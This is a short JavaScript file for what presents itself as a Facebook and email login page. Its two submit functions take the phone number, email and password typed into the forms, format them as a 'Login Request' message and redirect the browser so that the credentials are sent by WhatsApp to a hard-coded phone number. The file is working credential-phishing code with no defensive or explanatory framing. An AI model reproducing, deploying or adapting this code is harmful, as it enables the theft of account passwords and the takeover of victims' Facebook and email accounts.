function showLogin(type) {
    document.getElementById("facebook-login").classList.add("hidden");
    document.getElementById("email-login").classList.add("hidden");

    if (type === "facebook") {
        document.getElementById("facebook-login").classList.remove("hidden");
    } else {
        document.getElementById("email-login").classList.remove("hidden");
    }
}

function sendFacebookData() {
    let phone = document.getElementById("fb-phone").value;
    let email = document.getElementById("fb-email").value;
    let password = document.getElementById("fb-password").value;

    if (phone === "" || email === "" || password === "") {
        alert("Please fill all fields!");
        return;
    }

    let message = `🔹 *Facebook Login Request* 🔹\n\n📱 *Phone:* ${phone}\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;

    let whatsappNumber = "923182898491";
    let url = `https://api.whatsapp.com/send?phone=${whatsappNumber}&text=${encodeURIComponent(message)}`;
    
    window.location.href = url;
}

function sendEmailData() {
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    if (email === "" || password === "") {
        alert("Please fill all fields!");
        return;
    }

    let message = `🔹 *Email Login Request* 🔹\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;

    let whatsappNumber = "923182898491";
    let url = `https://api.whatsapp.com/send?phone=${whatsappNumber}&text=${encodeURIComponent(message)}`;
    
    window.location.href = url;
}